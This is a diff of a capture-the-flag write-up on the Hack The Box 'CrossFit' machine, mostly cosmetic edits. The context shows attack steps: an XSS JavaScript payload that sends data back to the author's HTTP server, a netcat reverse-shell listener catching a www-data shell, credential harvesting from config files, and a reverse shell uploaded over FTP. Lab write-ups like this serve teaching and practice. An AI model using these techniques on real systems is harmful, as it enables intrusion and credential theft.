@@ -362,7 +362,7 @@ request2.send()
 I wrote a JavaScript payload to reach out to the `ftp.crossfit.htb` site then send the response back to my waiting Python HTTP server. I used this instead of netcat so the server would stay active and I wouldn't have to restart it each time the server closed the connection.
 
 ```text
-┌──(zweilos㉿kalimaa)-[~/htb/crossfit]
+┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ python3 -m http.server 8090                                      
 Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
 10.10.10.208 - - [15/Jan/2021 18:21:03] "GET /test.js HTTP/1.1" 200 -
@@ -631,7 +631,7 @@ I decoded the HTML response, then saved it to a file.
 
 After recreating the webpage from the response, I could see that my account was created successfully!  Next I tried to log into the server using FTP.
 
-### Port 21 - FTP \(using LFTP\)
+### Port 21 - Revisited \(using LFTP\)
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
@@ -853,12 +853,12 @@ Got a connection...
 ## Initial Foothold
 
 ```text
-┌──(zweilos㉿kalimaa)-[~/htb/crossfit]
+┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ script initial-foothold                                                                         1 ⨯
 Script started, output log file is 'initial-foothold'.
-┌──(zweilos㉿kalimaa)-[~/htb/crossfit]
+┌──(zweilos㉿kali)-[~/htb/crossfit]
 └─$ bash                                                             
-zweilos@kalimaa:~/htb/crossfit$ nc -lvnp 8091
+zweilos@kali:~/htb/crossfit$ nc -lvnp 8091
 listening on [any] 8091 ...
 connect to [10.10.14.161] from (UNKNOWN) [10.10.10.208] 60548
 Linux crossfit 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64 GNU/Linux
@@ -869,9 +869,9 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'   
 www-data@crossfit:/$ ^Z
 [1]+  Stopped                 nc -lvnp 8091
-zweilos@kalimaa:~/htb/crossfit$ stty size
+zweilos@kali:~/htb/crossfit$ stty size
 54 104
-zweilos@kalimaa:~/htb/crossfit$ stty raw -echo
+zweilos@kali:~/htb/crossfit$ stty raw -echo
 nc -lvnp 8091aa:~/htb/crossfit$ 
 
 www-data@crossfit:/$ stty rows 54 columns 104
@@ -1208,12 +1208,6 @@ drwxr-xr-x  2 root     root   4096 May  1  2020 html
 
 While checking for other folders in the `/var/www` directory I noticed a few other than the standard `html`
 
-```php
-
-```
-
- to switch users to `isaac` or `root`.
-
 ```sql
 hank@crossfit:/var/www/gym-club$ mysql -u crossfit -p -D crossfit
 Enter password: 
@@ -1305,7 +1299,7 @@ MariaDB [information_schema]> show tables;
 ---snipped---
 ```
 
-I used the credentials to log into the database, but there was no useful information there. It only held information that was displayed on the website
+I used the credentials to log into the database, but there was no useful information there. It only held information that was displayed on the website.
 
 ```php
 <?php
@@ -1361,7 +1355,7 @@ if($conn)
 </html>
 ```
 
-In the security\_threat folder there was a reports.php that held the code for reporting the detected xss events
+In the `/security_threat` folder there was a file called `reports.php` that held the code for reporting the detected XSS events to the admin.  Apparently there was also another file that saved the report to the database, because this one only retrieved it, displayed it to the `reports.php` page when viewed, then deleted it from the database.
 
 ```text
 hank@crossfit:/home/isaac/send_updates$ find / -group admins 2>/dev/null
@@ -1411,7 +1405,9 @@ auth    required        pam_listfile.so item=user sense=deny file=/etc/ftpusers 
 auth    required        pam_shells.so
 ```
 
-In /etc/pam.d the file vsftpd contained the password for `ftpadm`
+### `ftpadm`
+
+In `/etc/pam.d` the file `vsftpd` contained the password for `ftpadm`.
 
 ```bash
 # Set this to 'yes' to enable PAM authentication, account processing,
@@ -1464,24 +1460,7 @@ Subsystem       sftp    /usr/lib/openssh/sftp-server
 DenyUsers ftpadm
 ```
 
-Unfortunately the ssh configuration was set to explicitely deny `ftpadm` from logging in through ssh
-
-```text
-┌──(zweilos㉿kali)-[~/htb/crossfit]
-└─$ ftp 10.10.10.208
-Connected to 10.10.10.208.
-220 Cross Fit Ltd. FTP Server
-Name (10.10.10.208:zweilos): ftpadm
-530 Non-anonymous sessions must use encryption.
-Login failed.
-421 Service not available, remote server has closed connection
-```
-
-I tried to login to ftp using these credentials, but got an error stating that I needed to use encryption for non-anonymous sessions. I can't use SFTP since SSH is denied for this user, so I must need to use FTPS
-
-
-
-[https://serverfault.com/questions/411970/how-to-avoid-lftp-certificate-verification-error](https://serverfault.com/questions/411970/how-to-avoid-lftp-certificate-verification-error)
+Unfortunately the SSH configuration was set to explicitly deny `ftpadm` from logging in through SSH.  I could also see that it was configured to run the subsystem for SFTP.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/crossfit]
@@ -1491,7 +1470,9 @@ lftp ftpadm@10.10.10.208:~> ls
 drwxrwx---    2 1003     116          4096 Sep 21 10:19 messages
 ```
 
-Using the parameter `set ssl:verify-certificate no` got rid of the warning and allowed me to log in. There was only one folder `messages`, which I had read-write access to, but it was empty. Once again I uploaded a reverse shell and executed it, but I wasnt sure where the folder was
+I tried instead to log in through FTP once again.  There was only one folder `messages`, which I had read-write access to, but it was empty. Once again I uploaded a reverse shell and tried to execute it, but I wasn't sure where the folder was.
+
+### send\_updates.php
 
 ```bash
 # /etc/crontab: system-wide crontab
@@ -1520,7 +1501,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 #
 ```
 
-In /etc/crontab there was a cron running every minute as the user `isaac`. This cron ran the script `send_updates.php` from /home/issac/
+In `/etc/crontab` there was a cron running every minute as the user `isaac`. This cron ran the script `send_updates.php` from `/home/issac/`.
 
 ```php
 <?php
@@ -1562,9 +1543,9 @@ cleanup();
 ?>
 ```
 
-In the folder /home/isaac/send\_updates there was a php file. Reading through the code, it seemed as if it was created to email the Crossfit Club Newsletter automatically to all users in the database. The `mail` command was being run by the `mikehaertl\shellcommand\Command` library, which after a short search I found on github.
+In the folder `/home/isaac/send_updates` I found the `send_updates.php` file. Reading through the code, it seemed as if it was created to email the "CrossFit Club Newsletter" automatically to all users in the database \(once a minute?! talk about spam!\). The `mail` command was being run by the `mikehaertl\shellcommand\Command` library, which after a short search I found on GitHub.
 
-[https://github.com/mikehaertl/php-shellcommand](https://github.com/mikehaertl/php-shellcommand)
+* [https://github.com/mikehaertl/php-shellcommand](https://github.com/mikehaertl/php-shellcommand)
 
 > php-shellcommand provides a simple object oriented interface to execute shell commands.
 
